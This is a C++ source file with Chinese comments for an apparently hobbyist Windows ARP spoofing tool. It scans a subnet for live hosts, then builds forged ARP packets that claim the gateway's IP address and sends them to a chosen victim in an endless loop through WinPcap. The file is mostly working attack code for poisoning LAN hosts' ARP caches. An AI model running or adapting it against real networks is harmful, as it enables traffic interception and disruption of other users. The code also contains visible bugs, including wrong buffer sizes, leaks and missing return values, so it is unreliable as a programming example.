#include "stdafx.h"
#include <Iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib") //需要添加Iphlpapi.lib库
/* 全局 变 量 */


bool _Now_Scan = false;   //正在扫描 ????

char _Mac_MySelf [200]={0};  //本机现在网卡的MAC地址
char _IP_MySelf  [200]={0};  //本机现在网卡的IP 地址
char _IP_GW      [200]={0};  //网关的        IP 地址

 


/*函数功能:将多字节转为宽字节                                                              */
/*参数1:多字节指针                                                                         */
/*参数2:宽字节缓冲区指针                                                                   */
/*返回值:如果函数运行成功，并且cchWideChar不为零                                           */
int _AtoW(char *a,TCHAR* w)
{
	size_t size = 0;
	if(!a) return 0;
	int len = lstrlenA(a) *  sizeof(char);

	/*返回缓冲区需要的大小*/
	if(!w)  
	{
	 size =  MultiByteToWideChar(CP_ACP,0,a,len,NULL,0);
	return size;
	}
	/*返回缓冲区需要的大小*/
	else
		return  MultiByteToWideChar(CP_ACP,0,a,len,w,lstrlenA(a) * sizeof(TCHAR));



}

/*函数功能:将宽字节转为多字节                                                              */
/*参数1:多字节指针                                                                         */
/*参数2:宽字节缓冲区指针                                                                   */
/*返回值:如果函数运行成功，并且cchWideChar不为零                                           */
int _WtoA(char *a,TCHAR* w)
{	
	size_t size = 0;
	if(!w) return 0;

	/* 得到长度*/
	int len = lstrlenW(w) *  sizeof(TCHAR);

	/*返回缓冲区需要的大小*/
	if(!a)  
	{
		/*返回需要的空间大小*/
	 size =  WideCharToMultiByte(CP_ACP,0,w,-1,NULL,NULL,NULL,NULL);
	 return size;
	}
	   /*转换*/

	else
	

		return  WideCharToMultiByte(CP_ACP, 0, w, -1, a, len, NULL, NULL);    

}




#define First  _T("IP地址")
#define Second _T("MAC地址")
#define Third  _T("ARP欺骗")
#define Four   _T("HANDLE")
#define With 150



//=================================================================================================================================================
/* 变量 */
CListCtrl * _cListCtrl = NULL;
/* 函数功能:初始化列表框    */
/* 参数1: 列表框指针        */
/* 返回值:成功返回0  否则非0*/
int _InitListCtrl(CListCtrl *cListCtrl)
{
	if(!cListCtrl) return 1;
	else
		cListCtrl->InsertColumn(0,Four,0,With,0);
	    cListCtrl->InsertColumn(0,Third,0,With,0);
	    cListCtrl->InsertColumn(0,Second,0,With,0);
		cListCtrl->InsertColumn(0,First,0,With,0);
		
		_cListCtrl = cListCtrl;
	return 0;
}


/* 函数功能:填加到列表框    */
/* 参数1: ip        */
/* 参数2: mac        */
/* 返回值:成功返回0  否则非0*/
int _List_Add(CListCtrl *cListCtrl,TCHAR *iP,TCHAR *Mac)
{
	if(!cListCtrl) return 1;

	int i = 0;
	i = cListCtrl->InsertItem(0,iP,0);

	
	return cListCtrl->SetItem(i,1,1,Mac,0,0,0,0,0);

}

int _ListSetHandle(CListCtrl *cListCtrl, int handle,int n)
{   if(!cListCtrl) return 1; 
    TCHAR i[20]={0};
    _itow_s(handle,i,10);
	return cListCtrl->SetItem(n,3,1,i,0,0,0,0,0);
}


int _ListSetMac  (CListCtrl*cListCtrl,TCHAR *Mac,int n)
{   if(!cListCtrl) return 1;
	return cListCtrl->SetItem(n,1,1,Mac,0,0,0,0,0);
}
/* 函数功能:获取IP    */
/* 参数1: ip缓冲区        */
/* 参数2: 索引        */
/* 返回值:成功返回0  否则非0*/
int _List_GetiP  (CListCtrl *cListCtrl,TCHAR*iP,int inDex)
{
	if(!cListCtrl || !iP) return 1;

	/* 申请空间      */
	TCHAR *__Tchar = new TCHAR[255];



	/* 初始化!好习惯 */
	memset(__Tchar,0,255);



	/* 获取          */
	cListCtrl->GetItemText(inDex,0,__Tchar,255);

	/* Debug         */
	//MessageBox(NULL,__Tchar,NULL,MB_OK);



	/* Copy          */
	int __len = lstrlenW(__Tchar) * sizeof(TCHAR);
	memcpy(iP,__Tchar,__len);


	/*Delete Pointer  */
	delete __Tchar;

}


/* 函数功能:获取IP    */
/* 参数1: ip缓冲区        */
/* 参数2: 索引        */
/* 返回值:成功返回0  否则非0*/
int _List_GetMac  (CListCtrl *cListCtrl,TCHAR*Mac,int inDex)
{
	if(!cListCtrl || !Mac) return 1;
	/* 申请空间      */
	TCHAR *__Tchar = new TCHAR[255];
	/* 初始化!好习惯 */
	memset(__Tchar,0,255);
	/* 获取          */
	cListCtrl->GetItemText(inDex,1,__Tchar,255);
	/* Debug         */
	//MessageBox(NULL,__Tchar,NULL,MB_OK);
	/* Copy          */
	int __len = lstrlenW(__Tchar) * sizeof(TCHAR);
	memcpy(Mac,__Tchar,__len);
	/*Delete Pointer  */
	delete __Tchar;

}
int _List_GetHanlde  (CListCtrl *cListCtrl,TCHAR*Mac,int inDex)
{
	if(!cListCtrl || !Mac) return 1;
	/* 申请空间      */
	TCHAR *__Tchar = new TCHAR[255];
	/* 初始化!好习惯 */
	memset(__Tchar,0,255);
	/* 获取          */
	cListCtrl->GetItemText(inDex,3,__Tchar,255);
	/* Debug         */
	//MessageBox(NULL,__Tchar,NULL,MB_OK);
	/* Copy          */
	int __len = lstrlenW(__Tchar) * sizeof(TCHAR);
	memcpy(Mac,__Tchar,__len);
	/*Delete Pointer  */
	delete __Tchar;

}
//==================================================================================================================================================






//==================================================================================================================================================
/* 函数功能:是否为合格的IP         */
/* 参数1:网卡GUID指针              */  //为了方便这里就用char了
/* 参数1:IP      指针              */  //为了方便这里就用char了
/* 参数1:网关    指针              */  //为了方便这里就用char了
/* 返回值:合格true   不合格false   */
bool _iP_iSok (TCHAR *iP)
{
	unsigned int __len = lstrlenW(iP);
	if(__len <=7 ||  __len >15)             return false;
	else                                     return true;
}
bool _iP_GetiP(char *Guid,char *iP,char *Gw)
{
	if(!Guid || !iP || !Gw) return false;

	//PIP_ADAPTER_INFO结构体指针存储本机网卡信息
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();




	 //====================================================================================
	/* 处理一下 把{前面的去掉 */
	TCHAR *__szGuid = NULL;
	USHORT __size = _AtoW(Guid,NULL);
	__szGuid = new TCHAR[__size];
	memset(__szGuid,0,__size);
	_AtoW(Guid,__szGuid);
	__szGuid[__size]=0;
	/* 放到CString好处理- -   */
	CString __csGuid;
	__csGuid.SetString(__szGuid);
	/* 放到CString好处理- -   */
	USHORT __poin = __csGuid.Find(TEXT("{"));
	CString __Guid = __csGuid.Right(__csGuid.GetLength()-__poin);
	//====================================================================================
	if(__Guid.GetString()[0]==0) return 0;




	//得到结构体大小,用于GetAdaptersInfo参数
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);



	//调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
    int nRel = GetAdaptersInfo(pIpAdapterInfo,&stSize);

	//记录网卡数量
    int netCardNum = 0;

	if (ERROR_BUFFER_OVERFLOW == nRel)
    {
        //如果函数返回的是ERROR_BUFFER_OVERFLOW
        //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
        //这也是说明为什么stSize既是一个输入量也是一个输出量
        //释放原来的内存空间
        delete pIpAdapterInfo;
        //重新申请内存空间用来存储所有网卡信息
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
        nRel=GetAdaptersInfo(pIpAdapterInfo,&stSize);    
    }
	/* 好了!!找到要的GUID 然后返回  */


	for (PIP_ADAPTER_INFO i = pIpAdapterInfo; i!=NULL; i=i->Next)
	{
		/* 在这里我们只是需要网关和 IP地址 */
		/* 16 bytes of char*/
		/*

		typedef struct {
        char String[4 * 4];
        } IP_ADDRESS_STRING, *PIP_ADDRESS_STRING, IP_MASK_STRING, *PIP_MASK_STRING;
        */

		/* 比较是不是我们要的*/
	
		// 草 ! 又转!!


		//============转换过程==========
		size_t __dwSize = _AtoW(i->AdapterName,NULL);
		TCHAR *__szThar = new TCHAR [__dwSize + 1];
		memset(__szThar,0,sizeof(__dwSize));
		_AtoW(i->AdapterName,__szThar);
		__szThar[__dwSize] = 0;
		//MessageBox(NULL,__szThar,NULL,MB_OK);
		//============转换过程========== ->__szThar

		if(NULL == lstrcmp(__szThar,__Guid.GetString()))
		{
			   //找到老婆了
			lstrcpyA(iP,(char*)&i->IpAddressList.IpAddress);
			lstrcpyA(Gw,(char*)&i->GatewayList.IpAddress);
				goto del;
		}
		
		

		/* delete */
		delete []__szThar;
	}
	
del:delete pIpAdapterInfo;
	return true;
}
//==================================================================================================================================================




//==================================================================================================================================================
/* 函数功能:*/ 
/* 参数1:*/ 
/* 参数2:*/
CEdit *_cEdit=NULL;
bool _Edit_Add_W(CEdit* edit,TCHAR *text)
{
	size_t len = 0;
	if(!edit) return false;
	else
    len  = edit->GetWindowTextLengthW()  *  sizeof(TCHAR)  +  lstrlenW(text) * sizeof(TCHAR) + 1;

	TCHAR *__szPoint = new TCHAR[len];
	memset(__szPoint,0,len);

	edit->GetWindowTextW(__szPoint,len);

	lstrcatW(__szPoint,text);

	edit->SetWindowTextW(__szPoint);

	_cEdit = edit;
	delete []__szPoint;
	return true;
}
bool _Edit_Add_A(CEdit* edit,char *text)
{
		 size_t len = 0;
	     if(!edit) return false;
	     else
			 len  = 	 ::GetWindowTextLengthA(edit->m_hWnd)   +   lstrlenA(text) + 1;
		 if(!len)  return false;

		 char *_szPoint = new char [len];
		 memset(_szPoint,0,len);

		 GetWindowTextA(edit->m_hWnd,_szPoint,len);
		 lstrcatA(_szPoint,text);
		 SetWindowTextA(edit->m_hWnd,_szPoint);
		 	_cEdit = edit;
	       delete []_szPoint;
	      return true;

}
//==================================================================================================================================================











//==================================================================================================================================================
/* 函数功能:*/ 
/* 参数1:*/ 
/* 参数2:*/
CButton *_Button_1,*_Button_2,*_Button_3,*_Button_4,*_Button_5;
int _InitButton(CButton *B1,CButton *B2,CButton *B3,CButton *B4,CButton *B5)
{
	_Button_1 = B1;
	_Button_2 = B2;
	_Button_3 = B3;
	_Button_4 = B4;
	_Button_5 = B5;
	return 1;
}
int _Button_Disable(CButton *B1,bool able)
{
	if(!B1) return 0;
	B1->EnableWindow(able);
	return 1;
}
//==================================================================================================================================================




//==================================================================================================================================================
//   ARP包头
#pragma pack(1)
typedef struct arphdr //arp头结构
{
unsigned short arp_hdr;    //ARP请求 OR ARP回复
unsigned short arp_pro;    //硬件类型
unsigned char  arp_hln;    //忘记了- -
unsigned char  arp_pln;    //忘记了- - 
unsigned short arp_opt;    //忘记了- - 
unsigned char  arp_sha[6]; //源  MAC
unsigned long  arp_spa;    //源  IP
unsigned char  arp_tha[6]; //目的MAC
unsigned long  arp_tpa;    //目的IP
}ARPHDR,*PARPHDR;


//   以太头
typedef struct ethdr 
{
unsigned char  eh_src[6];  //源   MAC
unsigned char  eh_dst[6];  //目的 MAC
unsigned short eh_type;    //协议类型 - -ARP = = 0x0806
}ETHDR,*PETHDR;

bool _Other_GetMacByIp(TCHAR *IP,TCHAR *MAC)
{
	if(!IP || !MAC) return false;
		 /* SendARP */
	 ULONG  Len = 6;
	 wchar_t *WStr;
	 char __mac[20]={0},__mac_[20]={0};
	 TCHAR *__MAC = NULL;

	 /**/
	 size_t _size = _WtoA(NULL,IP);
	 char *_IP = new char[_size + 1] ;
	 memset(_IP,0,_size);
	 _WtoA(_IP,IP);
	 _IP[_size] = NULL;

	 /*Debug*/

	 IPAddr _MAC[3]= {0};
	 ULONG  _LEN = 6;
	 if(NO_ERROR==SendARP(inet_addr(_IP),NULL,_MAC,&_LEN))
	 {
		 //
		  BYTE  *__p = (PBYTE)&_MAC;
		for ( BYTE  i = 0; i <6; i++)
	   {

		            Sleep(100);
		            wsprintfA(__mac,"%.2X",*(__p+i));
		         	lstrcatA(__mac_,__mac);
	   }
		/*还要转到UNICODE*/
		size_t __size =  _AtoW(__mac_,NULL);
		TCHAR *_TMAC = new TCHAR[__size + 1];
		memset(_TMAC,0,__size);
		_AtoW(__mac_,_TMAC);
		_TMAC[__size] = 0;
		lstrcpyW(MAC,_TMAC);
		delete []_TMAC;


	 }
}


/* 变量 */
pcap_t *adhandle = NULL;

	char _szBuffer[250] = {0};//最终数据包


/* 函数功能:无限发送*/
/* 参数1:发送的数据*/
bool _Arp__Attack()
{
	return true;

}


/* 函数功能:转换MAC */
bool _Arp_ToMac(char *In_Mac,unsigned char *Out_Mac)
{
	int i_i = 0;
	char temp[20]={0};
	USHORT Q_Q = 0;
	int q=0;
	int value = 0;
	int QYG = 0;
	int HYG = 0;
	int var = 0;
	unsigned char src[8] = {0};
	for (int i = 0; i < 12; i++)
	{
       lstrcpynA((LPSTR)&temp,In_Mac+i,2);
	   
	   if(temp[0] >= 65 && temp[0] <=90)
	   {
		    i_i = (int)temp[0]  - 55;
			
	   }
	   else i_i = atoi(temp);
	   if(0==i%2)
	   {
		   QYG = i_i;
	   }
	   else HYG=i_i;
	   q++;
	   if(q==2)
	   {
		   value = QYG * 16 + HYG;

		   memcpy(Out_Mac + var,&value,2);
		 
		   q = 0;
		   var++;
	   }

	   

	}
	return true;
}

/* 函数功能 线程管理*/
bool _Arp_Attack_Send()
{
	//if(szBuffer) return false;
	unsigned char sz_Buffer[250] = {0};
	memcpy(sz_Buffer,_szBuffer,42);
	while (true)
	{
		pcap_sendpacket(adhandle,(unsigned char*)sz_Buffer,42);

		Sleep(10);
	}
}

/* 函数功能:组成数据包开启线程发送*/
/* 参数1:MAC*/
/* 参数2:IP*/
bool _Arp_Attack(TCHAR *Mac,TCHAR *IP,char *GUID,int index)
{
	
	/* 构造 以太网头 */
	/*==*/ ETHDR  _ETHDR  = {0};
	   
	/*==*/_ETHDR.eh_type =  htons(0x0806);
	/*==*//*取出本机MAC    */
	/*==*/TCHAR __MAC[200]={0};
	/*==*//* 以太网头 直接填进去就可以了*/
	/*==*///CopyMemory(_ETHDR.eh_src,(void*)_Mac_MySelf,6);   //源  MAC

	      //转到CHAR  MAC
	/*==*/       size_t _size = _WtoA(NULL,Mac);
	/*==*/	     char *_sz = new char[_size+1];
	/*==*/	     memset(_sz,0,_size);
	/*==*/	    _WtoA(_sz,Mac);
	
	//MessageBoxA(NULL,NULL,NULL,MB_OK);

	/*==*/  //     CopyMemory(_ETHDR.eh_dst,(void*)_sz,6);   //目的MAC

	//源  MAC   _Mac_MySelf
	//目的MAC   _sz


	//==============================================================================================================================
	//不能直接COPY过去 那是字符串了- -
	unsigned char szMac[250]={0};
	/* 源MAC*/
	_Arp_ToMac(_Mac_MySelf,szMac);
	memcpy(_ETHDR.eh_dst,szMac,6);
	/* 目的MAC */
	_Arp_ToMac(_sz,szMac);
	memcpy(_ETHDR.eh_src,szMac,6);
	//==============================================================================================================================

   //源MAC和目的MAC调错位置了= 







	//==============================================================================================================================
	/* 构造 ARP包头*/
	ARPHDR _ARPHDR = {0};
	
	_ARPHDR.arp_hdr = htons(001);
	_ARPHDR.arp_pro=  htons(0x800);
	_ARPHDR.arp_hln=6;
    _ARPHDR.arp_pln=4;
    _ARPHDR.arp_opt=htons(1);
	//_ARPHDR.arp_tpa=inet_addr(IP);
	 //转到CHAR IP
	/*==*/        _size = _WtoA(NULL,IP);
	/*==*/	     char *_sz_ip = new char[_size+1];
	/*==*/	     memset(_sz_ip,0,_size);
	/*==*/	    _WtoA(_sz_ip,IP);
	_ARPHDR.arp_spa=inet_addr(_IP_GW);            //这里是网关IP地址

	_ARPHDR.arp_tpa=inet_addr(_sz_ip);            //这里是要欺骗的IP地址
  //_ARPHDR.arp_sha = {0};                        //源MAC 随便填
	for (int i = 0; i < 6; i++)
		_ARPHDR.arp_sha[i] = 0xFF; 

	

	//_ARPHDR.arp_tha ;                          //COPY以太网头的就行了
	memcpy(_ARPHDR.arp_tha,_ETHDR.eh_dst,6);     //目的MAC
	 //==============================================================================================================================



	/* 最终数据包  */
//char _szBuffer[250] = {0};
	memcpy(_szBuffer,&_ETHDR,sizeof(ETHDR));
	memcpy(_szBuffer + sizeof(ETHDR),&_ARPHDR,sizeof(ARPHDR));
	/* 最终数据包 */
    // 最后要发送的数据就在 _szBuffer[]

	

	char Errbuf[200]={0};
	if(!GUID) goto del;
	adhandle = pcap_open_live(GUID,65536,1,1000,Errbuf);  //打开网卡并且设置为 [混杂模式]
	if(!adhandle) {MessageBoxA(NULL,Errbuf,NULL,MB_OK); goto del;}

	/* 启动线程  让线程去 发送 */
	//while (true)

	pcap_sendpacket(adhandle,(unsigned char *)&_szBuffer,42);

	

	//memcpy(p,_szBuffer,sizeof(ETHDR) + sizeof(ARPHDR));
	
	/**/ // 第一次DEBUG
	//以太 网头的 目的MAC不对

	//ARP头的 塬MAC不对


	/**/

	HANDLE Th = CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)_Arp_Attack_Send,NULL,NULL,NULL);

	_ListSetHandle(_cListCtrl,(int)Th,index);



del:delete []_sz; delete []_sz_ip;
	//==============================================================================================================================
	return true;
	
}
//==================================================================================================================================================







//==================================================================================================================================================
HANDLE _Arp_Event = 0;
char   _Arp_sziP[100]={0};
USHORT _Arp_Thrd = 0;

/* 函数功能:扫描*/
/* 参数1:*/
/* 参数2:*/
void   _Arp_Watch     (int __i)
{
	_Arp_Thrd = 0;
	while (true)
	{
		Sleep(1);
		char szBuf[10]={0};
		_itoa_s(_Arp_Thrd,szBuf,10);
		//就是这里 有高手搞好的说下- -
		if(__i == _Arp_Thrd || (_Arp_Thrd == __i-1) || (_Arp_Thrd == __i-2)|| (_Arp_Thrd == __i-3))
		{
			_Edit_Add_A(_cEdit,"所有线程已经回来\r\n");
			_Button_Disable(_Button_1,true);
			_Now_Scan = false;
			break;
		}
	}
}

/* 函数功能:扫描*/
/* 参数1:*/
/* 参数2:*/
void   _Arp_Scan      (int  _i)
{
	 
	 char __sz[200] = {0};
	 char __sp[100] = {0};
	 char __s[10]={0};
	 lstrcpyA(__sp,_Arp_sziP);
	 _itoa_s(_i,__s,10);
	 lstrcatA(__sp,__s);


	 /* SendARP */
	 IPAddr Mac[3]={0};
	 ULONG  Len = 6;
	 wchar_t *WStr;
	 char __mac[20]={0},__mac_[20]={0};
	 TCHAR *__MAC = NULL;
	 Sleep(100);
	 if(NO_ERROR == SendARP(inet_addr(__sp),NULL,Mac,&Len))
	 {
		 /* 这个主机存活  */
	    size_t len = strlen(__sp) + 1;
        size_t converted = 0;
 
       WStr=(wchar_t*)malloc(len*sizeof(wchar_t));
	
       mbstowcs_s(&converted, WStr, len, __sp, _TRUNCATE);

	   /* 处理 MAC*/
	   BYTE  *__p = (PBYTE)&Mac;

	   for ( BYTE  i = 0; i <6; i++)
	   {

		       
		            wsprintfA(__mac,"%.2X",*(__p+i));
		         	lstrcatA(__mac_,__mac);
	   }
		 
	   /* 转为UNICODE */
	   size_t size =  _AtoW(__mac_,NULL);
	   __MAC = new TCHAR[size + 1];
	   memset(__MAC,0,size);
	   _AtoW(__mac_,__MAC);
	   __MAC[size] = 0;
	   lstrcatA(__mac,__mac_);
	   //MessageBoxA(NULL,__mac_,NULL,MB_OK);
	  OutputDebugStringW(__MAC);
	  OutputDebugStringW(TEXT("\n"));
	    //  Sleep(2000);
	   //_List_Add(_cListCtrl,WStr,__MAC);

	 //_ListSetMac(_cListCtrl,__MAC,_i);
	   //ReleaseMutex(_Arp_Event);
	 }
	
	  
	//  WaitForSingleObject(_Arp_Event,3000); 
	 /* _Edit_Add_A(_cEdit,__s);
	  _Edit_Add_A(_cEdit,"号线程执行完毕!");
	  _Edit_Add_A(_cEdit,"\r\n");*/


	  /* - - */
	 WaitForSingleObject(_Arp_Event,1000); 
	 if(__MAC)
	 {
	 _List_Add(_cListCtrl,WStr,__MAC);
	 
	 }
	  ++_Arp_Thrd; 
	 ReleaseMutex(_Arp_Event);

	


}

/* 函数功能:使用ARP来扫描*/ 
/* 参数1:起始IP*/ 
/* 参数2:IP数目*/
void _Arp_StartScan(char *startip,int start,int num)
{
	  size_t _i = 0;
	 _Arp_Event = ::CreateMutex(NULL,false,NULL);
	 if(!_Arp_Event) return ;

	 //处理掉
	  _i = lstrlenA(startip)+1;
	 while (_i--)
	 {
		 if(startip[_i]=='.')
		 {
			 lstrcpynA(_Arp_sziP,startip,_i+2); //为什么 +2..........自己调试..
			 break;
		 }
	 }

	 for (int i = start; i <= num; i++)
	 {
		 //启动线程...
		 ::CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&_Arp_Scan,(LPVOID)i,NULL,NULL);
	 }
	 /* 还有一条监控线程 */
	 ::CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&_Arp_Watch,(LPVOID)num,NULL,NULL);


	 //标记 正在扫描
	 _Now_Scan = true;


}


bool   _Arp_Scaning   (){return _Now_Scan;}

//==================================================================================================================================================



bool _Set_Mac_MySelf(char *MAC)
{
	if(!MAC) return false;
	return lstrcpyA(_Mac_MySelf,MAC);
}
bool _Set_IP_MySelf(char *IP)
{
	if(!IP) return false;
	return lstrcpyA(_IP_MySelf,IP);
}

bool _Set_Gw_MySelf(char *gw)
{	if(!gw) return false;
	return lstrcpyA(_IP_GW,gw);
}